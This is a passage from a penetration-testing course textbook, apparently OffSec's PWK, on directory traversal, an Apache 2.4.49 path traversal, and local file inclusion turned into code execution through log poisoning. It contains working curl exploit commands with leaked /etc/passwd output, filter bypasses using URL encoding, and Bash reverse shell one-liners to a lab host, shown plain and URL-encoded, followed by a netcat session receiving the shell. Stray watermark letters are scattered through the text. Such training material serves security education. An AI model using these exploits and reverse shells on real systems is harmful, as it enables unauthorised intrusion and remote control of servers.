Reviewing the Microsoft documentation,390 we learn that the logs are located at
C:\inetpub\logs\LogFiles\W3SVC1\. Another file we should always check when the target is
s
running an IIS web server is C:\inetpub\wwwroot\web.config, which may contain sensitive
information like passwords or usernames.
o
In this section, we used the ../ sequence for directory traversal on Linux. As shown, Windows uses
backslashes instead of forward slashes for file paths. Therefore, ..\ is an important alternative to
173839n1
../ on Windows targets. While RFC specifies to always use slashes in a URL, we may
encounter web applications on Windows which are only vulnerable to directory traversal using
backslashes. Therefore, we should always try to leverage both forward slashes and backslashes
i
when examining a potential directory traversal vulnerability in a web application running on
z
Windows.
9.1.3 Encoding SpeciDal Characters
Having honed our understanding of directory traversal concepts using the “Mountain Desserts”
web application, let’s try applying these skills to a real vulnerability. In the “Vulnerability Scanning”
topic, we scanned the SAMBA machine and identified a directory traversal vulnerability in Apache
2.4.49.392 This vulnerability can be exploited by using a relative path after specifying the cgi-bin
directory in the URL.
Let’s use curl and multiple ../ sequences to try exploiting this directory traversal vulnerability in
Apache 2.4.49 on the WEB18 machine.
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
389 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Internet_Information_Services
390 (Microsoft Documentation, 2020), https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-
file-storage
391 (IETF, 1994), https://www.ietf.org/rfc/rfc1738.txt
392 (CVE Mitre, 2021), https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 256
Made in Morocco
Penetration Testing with Kali Linux
404 Not Found
Not Found
The requested URL was not found on this server.
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-
bin/../../../../../../../../../../etc/passwd
404 Not Found
Not Found
The requested URL was not found on this server. y
Listing 138 - Using “../” to leverage the Directory Traversal vulnerability in Apache 2.4.49
k
Listing 138 demonstrates that after attempting two queries with a different number of ../, we
could not display the contents of /etc/passwd via directory traversal. Because leveraging ../ is a
s
known way to abuse web application behavior, this sequence is often filtered by either the web
server, web application firewalls,393 or the web application itself.
o
Fortunately for us, we can use URL Encoding,394 also called Percent Encoding, to potentially
bypass these filters. We can leverage specific ASCII encoding lists395 to manually encode our
n
query from listing 138 or use the online converter on the same page. For now, we will only encode
the dots, which are represented as “%2e”.
i
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-
z
bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/biDn/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
Listing 139 - Using encoded dots for Directory Traversal
We have successfully used directory traversal with encoded dots to display the contents of
/etc/passwd on the target machine.
Generally, URL encoding is used to convert characters of a web request into a format that can be
transmitted over the internet. However, it is also a popular method used for malicious purposes.
The reason for this is that the encoded representation of characters in a request may be missed
by filters, which only check for the plain-text representation of them e.g. ../ but not %2e%2e/. After
the request passes the filter, the web application or server interprets the encoded characters as a
valid request.
393 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Web_application_firewall
394 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Percent-encoding
395 (w3schools, 2022), https://www.w3schools.com/tags/ref_urlencode.asp
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 257
Made in Morocco
Penetration Testing with Kali Linux
9.2 File Inclusion Vulnerabilities
This Learning Unit covers the following Learning Objectives:
• Learn the difference between File Inclusion and Directory Traversal vulnerabilities
• Gain an understanding of File Inclusion vulnerabilities
• Understand how to leverage Local File Inclusion (LFI) to obtain code Execution
• Explore PHP wrapper usage
• Learn how to perform Remote File Inclusion (RFI) attacks
In this Learning Unit, we’ll cover File Inclusion396 vulnerabilities. We will demonstrate how to
exploit a Local File Inclusion (LFI) vulnerability using a case study. We will also analyze the
differences between File Inclusion and Directory Traversal vulnerabyilities. We’ll then learn about
PHP Wrappers,397 which can be used to bypass filters and other constraints. Finally, we will
examine Remote File Inclusion (RFI) vulnerabilities, which allow us to include files from a
k
controlled system.
s
9.2.1 Local File Inclusion (LFI)
Before we examine Local File Inclusion (LFI), leot’s take a moment to explore the differences
between File Inclusion and Directory Traversal. These two concepts often get mixed up by
penetration testers and security professionals. If we confuse the type of vulnerability we find, we
n
may miss an opportunity to obtain code execution.
As covered in the last Learning Unit, we can use directory traversal vulnerabilities to obtain the
i
contents of a file outside of the web server’s web root. File inclusion vulnerabilities allow us to
z
“include” a file in the application’s running code. This means we can use file inclusion
vulnerabilities to execute local or remote files, while directory traversal only allows us to read the
contents of a file. Since weD can include files in the application’s running code with file inclusion
vulnerabilities, we can also display the file contents of non-executable files. For example, if we
leverage a directory traversal vulnerability in a PHP web application and specify the file
admin.php, the source code of the PHP file will be displayed. On the other hand, when dealing with
a file inclusion vulnerability, the admin.php file will be executed instead.
In the following example, our goal is to obtain Remote Code Execution (RCE) via an LFI
vulnerability. We will do this with the help of Log Poisoning.398 Log Poisoning works by modifying
data we send to a web application so that the logs contain executable code. In an LFI vulnerability
scenario, the local file we include is executed if it contains executable content. This means that if
we manage to write executable code to a file and include it within the running code, it will be
executed.
In the following case study, we will try to write executable code to Apache’s access.log file in the
/var/log/apache2/ directory. We’ll first need to review what information is controlled by us and
saved by Apache in the related log. In this case, “controlled” means that we can modify the
396 (Wikipedia, 2022), https://en.wikipedia.org/wiki/File_inclusion_vulnerability
397 (PHP Manual, 2010), https://www.php.net/manual/en/wrappers.php
398 (OWASP, 2022), https://owasp.org/www-community/attacks/Log_Injection
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 258
Made in Morocco
Penetration Testing with Kali Linux
information before we send it to the web application. We can either read the Apache web server399
documentation or display the file via LFI.
Let’s use curl to analyze which elements comprise a log entry by displaying the file access.log
using the previously-found LFI vulnerability. This means we’ll use the relative path of the log file in
the vulnerable “page” parameter in the “Mountain Desserts” web application.
kali@kali:~$ curl
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/a
pache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php
HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
...
Listing 140 - Log entry of Apache’s access.log y
Listing 140 shows that the User Agent400 is included in the log entry. Before we send a request, we
k
can modify the User Agent in Burp and specify what will be written to the access.log file.
Apart from the specified file, this command is equivalents to the directory traversal attack from the
previous Learning Unit. The exploitation of directory traversal and LFI vulnerabilities mainly differs
when handling executable files or content.
o
Let’s start Burp, open the browser, and navigate to the “Mountain Desserts” web page. We’ll click
on the Admin link at the bottom of the page, then switch back to Burp and click on the HTTP
n
history tab. Let’s select the related request and send it to Repeater.
i
z
D
Figure 128: Unmodified Request in Burp Repeater
We can now modify the User Agent to include the PHP code snippet of the following listing. This
snippet accepts a command via the cmd parameter and executes it via the PHP system401
function on the target system. We’ll use echo402 to display command output.
399 (Apache, 2022), https://httpd.apache.org/docs/2.4/logs.html
400 (Mozilla Developer Network, 2022), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent
401 (PHP Manual, 2022), https://www.php.net/manual/en/function.system.php
402 (PHP Manual, 2022), https://www.php.net/manual/en/function.echo.php
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 259
Made in Morocco
Penetration Testing with Kali Linux
Listing 141 - PHP Snippet to embed in the User Agent
After modifying the User Agent, let’s click Send.
y
k
Figure 129: Modified Request in Burp Repeater
The PHP code snippet was written to Apache’s access.lsog file. By including the log file via the LFI
vulnerability, we can execute the PHP code snippet.
o
To execute our snippet, we’ll first update the page parameter in the current Burp request with a
relative path.
n
../../../../../../../../../var/log/apache2/access.log
Listing 142 - Relative Path for the “page” parameter
i
We also need to add the cmd parameter to the URL to enter a command for the PHP snippet.
z
First, let’s enter the ps command to verify that the log poisoning is working. Since we want to
provide values for the two parameters (page for the relative path of the log and cmd for our
D
command), we can use an ampersand (&) as a delimiter. We’ll also remove the User Agent line
from the current Burp request to avoid poisoning the log again, which would lead to multiple
executions of our command due to two PHP snippets included in the log.
The final Burp request is shown in the Request section of the following Figure. After sending our
request, let’s scroll down and review the output in the Response section.
Figure 130: Output of the specified ls command through Log Poisoning
Figure 130 shows the output of the executed ps command that was written to the access.log file
due to our poisoning with the PHP code snippet.
Let’s update the command parameter with ls -la.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 260
Made in Morocco
Penetration Testing with Kali Linux
y
Figure 131: Using a command with parameters
The output in the Response section shows that our input trigkgers an error. This happens due to
the space between the command and the parameters. There are different techniques we can use
to bypass this limitation, such as using Input Field Separators (IFS)403 or URL encoding. With URL
s
encoding, a space is represented as “%20”.404
Let’s replace the space with “%20” and press Sendo.
n
i
z
D
Figure 132: URL encoding a space with %20
Figure 132 shows that our command executed correctly.
We have achieved command execution on the target system and can leverage this to get a
reverse shell or add our SSH key to the authorized_keys file for a user.
Let’s attempt to obtain a reverse shell by adding a command to the cmd parameter. We can use a
common Bash TCP reverse shell one-liner.405 The target IP for the reverse shell may need to be
updated in the labs.
403 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Input_Field_Separators
404 (w3schools, 2022), https://www.w3schools.com/tags/ref_urlencode.asp
405 (Github, 2022),
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheat
sheet.md#bash-tcp
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 261
Made in Morocco
Penetration Testing with Kali Linux
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
Listing 143 - Bash reverse shell one-liner
Since we’ll execute our command through the PHP system function, we should be aware that the
command may be executed via the Bourne Shell,406 also known as sh, rather than Bash. The
reverse shell one-liner in Listing 143 contains syntax that is not supported by the Bourne Shell. To
ensure the reverse shell is executed via Bash, we need to modify the reverse shell command. We
can do this by providing the reverse shell one-liner as argument to bash -c, which executes a
command with Bash.
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
Listing 144 - Bash reverse shell one-liner executed as command in Bash
We’ll once again encode the special characters with URL encoding.
y
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
Listing 145 - URL encoded Bash TCP reverse shell one-liner
k
The following figure shows the correct way to add our command in the request:
s
o
n
i
z
D
Figure 133: Encoded Bash reverse shell in “cmd” parameter
Before we send the request, let’s start a Netcat listener on port 4444 on our Kali machine. It will
receive the incoming reverse shell from the target system. Once the listener is started, we can
press Send in Burp to send the request.
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
406 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Bourne_shell
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 262
Made in Morocco
Penetration Testing with Kali Linux
Listing 146 - Successful reverse shell from the target system
Listing 146 shows that we successfully received the reverse shell in our Netcat listener. We now
have an interactive shell on the target system.
Before moving to the next section, let’s briefly explore LFI attacks on Windows targets. Exploiting
LFI on Windows only differs from Linux when it comes to file paths and code execution. The PHP
code snippet we used in this section for Linux also works on Windows, since we use the PHP
system function that is independent from the underlying operating system. When we use Log
Poisoning on Windows, we should understand that the log files are located in application-specific
paths. For example, on a target running XAMPP,407 the Apache logs can be found in
C:\xampp\apache\logs\.
Exploiting File Inclusion vulnerabilities depends heavily on the web application’s programming
language, the version, and the web server configuration. Outside PHP, we can also leverage LFI
y
and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl,408
Active Server Pages Extended,409 Active Server Pages,410 and Java Server Pages.411 Exploiting these
kinds of vulnerabilities is very similar across these languages. k
Let’s consider an LFI vulnerability in a JSP web application. If we can write JSP code to a file
s
using Log Poisoning and include this file with the LFI vulnerability, the code will be executed. The
only difference between this example and the previous PHP demonstration is that the code
o
snippet used for the Log Poisoning would be in a different language.
In real-life assessments, we’ll most often discover File Inclusion vulnerabilities in PHP web